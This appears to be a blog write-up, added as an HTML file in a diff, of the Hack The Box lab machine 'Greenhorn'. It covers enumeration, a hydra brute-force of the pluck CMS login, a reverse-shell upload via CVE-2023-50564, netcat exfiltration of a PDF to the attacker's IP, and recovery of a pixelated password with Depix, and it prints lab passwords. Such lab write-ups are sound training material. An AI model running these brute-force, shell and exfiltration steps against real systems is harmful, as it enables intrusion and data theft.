@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Greenhorn - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Greenhorn</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1724142233528"
+                  >2024-08-20 10:23</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1724154496786"
+                  >2024-08-20 13:48</time
+                ></span
+              >
+            </div>
+            
+            <div>
+              Keywords: 
+              <span class="keyword">linux</span>
+              
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p><img src="/_resources/8e105b890de640269ab596741d41f00a.png" /></p>
+<div><pre class="hljs"><code>└──╼ $nmap -p- -A greenhorn.htb
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 08:25 UTC
+Nmap scan report for greenhorn.htb (10.129.178.31)
+Host is up (0.034s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
+|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+| http-title: Welcome to GreenHorn ! - GreenHorn
+|_Requested resource was http://greenhorn.htb/?file=welcome-to-greenhorn
+|_http-trane-info: Problem with XML parsing of /evox/about
+|_http-generator: pluck 4.7.18
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-robots.txt: 2 disallowed entries 
+|_/data/ /docs/
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+3000/tcp open  ppp?
+| fingerprint-strings: 
+|   GenericLines, Help, RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Content-Type: text/html; charset=utf-8
+|     Set-Cookie: i_like_gitea=f8472946e7bb7aee; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=10zNRFqpKaYuRFW_9-ZNG2Lip3U6MTcyNDE0MjI5MzcwMzQ2NDk2OA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Tue, 20 Aug 2024 08:24:53 GMT
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang="en-US" class="theme-auto"&gt;
+|     &lt;head&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+|     &lt;title&gt;GreenHorn&lt;/title&gt;
+|     &lt;link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
+|   HTTPOptions: 
+|     HTTP/1.0 405 Method Not Allowed
+|     Allow: HEAD
+|     Allow: GET
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Set-Cookie: i_like_gitea=937130857acd1ee9; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=wEK50eH4jJ0NOpyY-HHhkxBO6DA6MTcyNDE0MjI5ODc4OTQ0NTMxNQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Tue, 20 Aug 2024 08:24:58 GMT
+|_    Content-Length: 0</code></pre></div>
+<div><pre class="hljs"><code>└──╼ $gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://greenhorn.htb  --append-domain -t 200
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://greenhorn.htb
+[+] Method:          GET
+[+] Threads:         200
+[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Progress: 3000000 / 3000001 (100.00%)
+===============================================================
+Finished
+===============================================================</code></pre></div>
+<p><img src="/_resources/e098dd71e7ef43b38e1d35f0b3f3219e.png" /></p>
+<p><img src="/_resources/2c072e8d1b2146839ad0e297c70748cb.png" /></p>
+<p>Most of the sites return 200, but then show:</p>
+<p><img src="/_resources/0a7718135b4841abb903df5de605d09d.png" /></p>
+<h1 id="gitea">Gitea</h1>
+<p>gitea is located on port 3000.<br />
+We can create an account and discover one repo on it.</p>
+<p><img src="/_resources/2b11bbff75f8406e82278b66d8018bb8.png" /></p>
+<p>We can find one other person watching this repo, its admin.</p>
+<p><img src="/_resources/0ccb74c11cf14d78ac7346f9f1a47b5b.png" /></p>
+<p>No CVE and no interesting files.</p>
+<h2 id="addon">addon</h2>
+<p>What I found later, there is no need to use hydra as on gitea there is a file GreenHorn/data/settings/pass.php with a hash.</p>
+<div><pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$ww</span> = <span class="hljs-string">'d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163'</span>;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+<p>We can crack it and get password for pluck and not brute force with hydra.</p>
+<h1 id="cve-2023-50564">CVE-2023-50564</h1>
+<p>Our main target seems to be:</p>
+<p><img src="/_resources/b5638cb1a700489ba6043f92dfaf614a.png" /></p>
+<p>Pluck tells us its version and it has a CVE ready for us.<br />
+<a title="https://nvd.nist.gov/vuln/detail/CVE-2023-50564" href="https://nvd.nist.gov/vuln/detail/CVE-2023-50564">https://nvd.nist.gov/vuln/detail/CVE-2023-50564</a></p>
+<p>All of the scripts require username and password, which we do not have.<br />
+We can “fix” this, running hydra</p>
+<div><pre class="hljs"><code>└──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt greenhorn.htb http-post-form "/login.php:cont1=^PASS^&amp;bogus=&amp;submit=Log+in:F=Password incorrect."
+Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-20 09:45:43
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://greenhorn.htb:80/login.php:cont1=^PASS^&amp;bogus=&amp;submit=Log+in:F=Password incorrect.
+[80][http-post-form] host: greenhorn.htb   login: admin   password: iloveyou1
+1 of 1 target successfully completed, 1 valid password found</code></pre></div>
+<p>We are in, time to try out the CVE.<br />
+<a title="https://www.exploit-db.com/exploits/51592" href="https://www.exploit-db.com/exploits/51592">https://www.exploit-db.com/exploits/51592</a></p>
+<p>ALL of the scripts did not work for me. I ended up uploading manually php-reverse-shell in a zip and it did work, so I do not understand why those scripts were even created.</p>
+<h1 id="user-access">User access</h1>
+<p>First, shell stablisation.</p>
+<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="hljs-built_in">export</span> TERM=xterm
+CTRL-Z
+stty raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span></code></pre></div>
+<p>Linpeas returns nothing of value.</p>
+<p>pspy:</p>
+<p><img src="/_resources/6205ee9d4e7642b8b2d541697286b905.png" /></p>
+<p><img src="/_resources/e298031ddca240d1bf046739dd455bab.png" /></p>
+<p>After wasting too much time, Ive tried as a joke to login to user “junior” with the same password as earlier and it worked. Dissapointing.</p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>In our home folder we have a file called “Using OpenVAS.pdf”.<br />
+We can send it back to us using netcat.</p>
+<div><pre class="hljs"><code><span class="hljs-meta"># </span><span class="language-bash">attacker</span>
+nc -l -p 12345 &gt; received_file.pdf
+<span class="hljs-meta">
+# </span><span class="language-bash">victim</span>
+nc 10.10.14.81 12345 &lt; file_to_send.pdf</code></pre></div>
+<p><img src="/_resources/826953a8df7345e3b8b6624522b7d95d.png" /></p>
+<p>There has to be a way to get the distorted password back.</p>
+<p>I’ve tried <a title="https://github.com/bishopfox/unredacter" href="https://github.com/bishopfox/unredacter">https://github.com/bishopfox/unredacter</a> and it failed to do anything. I’ve tried getting data with <code>strings</code> command and hexedit, nothing. I’ve tried <a title="https://github.com/spipm/Depix" href="https://github.com/spipm/Depix">https://github.com/spipm/Depix</a> and at first gave it input in .png format. Converiting to .ppm made it work.</p>
+<div><pre class="hljs"><code>pdfimages file.pdf file
+python3 depix.py     -p /home/user/Desktop/file-000.ppm     -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png     -o /home/user/Desktop/output.png</code></pre></div>
+<p><img src="/_resources/e44814814cc24f0bb5993fe34297d097.png" /></p>
+<p>password: sidefromsidetheothersidesidefromsidetheotherside</p>
+<p>We are done here. One of the worst rooms I’ve done.</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
